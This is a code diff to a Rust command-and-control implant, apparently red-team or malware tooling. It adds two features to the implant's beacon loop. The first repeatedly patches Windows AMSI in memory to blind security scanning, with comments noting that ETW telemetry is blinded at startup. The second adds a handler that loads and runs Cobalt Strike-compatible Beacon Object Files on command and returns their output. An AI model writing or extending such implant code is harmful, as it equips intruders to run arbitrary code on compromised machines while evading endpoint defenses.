@@ -71,6 +71,12 @@ pub unsafe fn beacon_loop() {
     // ---- task loop ----
     let mut pending: Vec<TaskResponse> = Vec::new();
     loop {
+        // Retry AMSI blinding each cycle: amsi.dll is demand-loaded (only when
+        // a scanner starts), so the first cycles usually can't resolve it.
+        // Once the host loads it, this lands the patch; subsequent cycles hit
+        // the idempotency short-circuit. ETW is blinded once at entry (always
+        // present).
+        unsafe { crate::blind::maybe_patch_amsi(); }
         sleep_jitter(cfg.sleep_seconds, cfg.jitter_pct);
         let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
         counter += 1;
@@ -112,6 +118,9 @@ fn execute(cmd: Command) -> Vec<Response> {
         Command::Ping => vec![Response::Ok],
         Command::Sleep { .. } => vec![Response::Ok], // TODO: re-task sleep
         Command::Exit => vec![Response::Ok],
+        // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
+        // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
+        Command::Bof { name, args, blob } => vec![crate::bof::run(&name, &args, &blob)],
         // Everything else is unimplemented in the PIC implant for M0; ack so the
         // wire stays round-trippable.
         _ => vec![Response::Err(String::from("not implemented in PIC implant"))],
